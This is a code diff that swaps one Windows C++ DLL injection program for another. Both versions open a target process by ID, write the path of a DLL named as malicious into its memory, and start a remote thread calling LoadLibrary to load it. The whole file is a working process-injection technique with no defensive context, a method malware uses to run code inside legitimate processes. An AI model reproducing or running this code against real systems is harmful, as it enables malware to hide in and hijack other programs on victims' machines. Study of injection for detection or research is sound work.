@@ -1,29 +1,15 @@
-#include <windows.h>
-#include <iostream>
-
-int main() {
-    DWORD processID;
-    std::cout << "Enter Process ID: ";
-    std::cin >> processID;
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
-    if (!hProcess) {
-        std::cerr << "Failed to open process." << std::endl;
-        return 1;
-    }
-
-    const char* dllPath = "C:\\malicious.dll";
-    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
-    if (!hThread) {
-        std::cerr << "Failed to create remote thread." << std::endl;
-    }
-    else {
-        std::cout << "DLL injected successfully!" << std::endl;
-    }
-
-    CloseHandle(hProcess);
-    return 0;
+int main(int argc, char *argv[]) {
+	HANDLE processHandle;
+	PVOID remoteBuffer;
+	wchar_t dllPath[] = TEXT("C:\\bad-dll.dll");
+	
+	printf(" Injecting to PID: %i\n", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
+	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CloseHandle(processHandle); 
+	
+	return 0;
 }
